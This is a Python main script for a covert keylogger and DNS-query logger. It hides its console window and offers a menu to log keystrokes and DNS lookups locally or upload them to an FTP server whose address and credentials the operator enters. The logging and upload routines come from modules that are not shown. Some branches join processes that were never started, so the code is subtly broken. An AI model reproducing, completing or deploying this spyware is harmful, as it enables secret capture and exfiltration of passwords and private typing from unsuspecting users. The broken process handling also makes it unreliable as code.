from utilities import dir_path, sync, server, hide_console
from logger import key_logger, dns_logger
import sys
import socket
import multiprocessing

def main():
    # add_startup() , add_startup

    # disallowing multiple instance
    # Create a socket object
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Try to bind the socket to the port
    try:
        sock.bind(('', 22122))
    except socket.error:
        # If the port is already in use, exit the script
        print('Multiple Instance not Allowed. \n ')
        sys.exit()
    
    dir_path()

    print("Welcome \n ")
    while True:
        print("Note: Npcap is required for Dns Logger on Windows. Get Npcap from https://npcap.com/#download. \n ")
        service_choise = int(input("Choose what service you want. \n 1. Key and Dns Quary logger with offline and ftp upload. \n 2. Key and Dns Quary logger offline Only.  \n 3. Key logger only with offline and ftp upload. \n 4. Key logger offline Only. \n 5. Dns Quary logger offline and ftp upload. \n 6. Dns Quary logger offline. \n 7. Exit \n"))
        if 0 < service_choise < 7:
            p1 = multiprocessing.Process(target=server, name="LocalServer")
            if service_choise in (1, 3, 5):
                print("Enter the ftp host/ip address, username and passward \n ")
                ftp_host = input("Host/Ip:")
                ftp_username = input("Username:")
                ftp_passward = input("Passward:")
                p2 = multiprocessing.Process(target=sync, args=(ftp_host, ftp_username, ftp_passward), name="SyncFtp")
                p2.start()
                if service_choise == 3:
                    p3 = multiprocessing.Process(target=key_logger, name="KeyLogger")
                    p3.start()
                elif service_choise == 5:
                    p4 = multiprocessing.Process(target=dns_logger, name="DNSQuaryLogger")
                    p4.start()
                else:
                    p3 = multiprocessing.Process(target=key_logger, name="KeyLogger")
                    p4 = multiprocessing.Process(target=dns_logger, name="DNSQuaryLogger")
                    p3.start()
                    p4.start()
                p1.start()
                p1.join()
                p2.join()
                p3.join()
                p4.join()
                break
            else:
                if service_choise == 4:
                    p3 = multiprocessing.Process(target=key_logger, name="KeyLogger")
                    p3.start()
                elif service_choise == 6:
                    p4 = multiprocessing.Process(target=dns_logger, name="DNSQuaryLogger")
                    p4.start()
                else:
                    p3 = multiprocessing.Process(target=key_logger, name="KeyLogger")
                    p4 = multiprocessing.Process(target=dns_logger, name="DNSQuaryLogger")
                    p3.start()
                    p4.start()
                p1.start()
                p1.join()
                p2.join()
                p3.join()
                p4.join()
        elif(service_choise == 7):
            sys.exit()
        else:
            print("Wrong Input! Try again. \n ")

if __name__ == "__main__":
    hide_console()
    main()
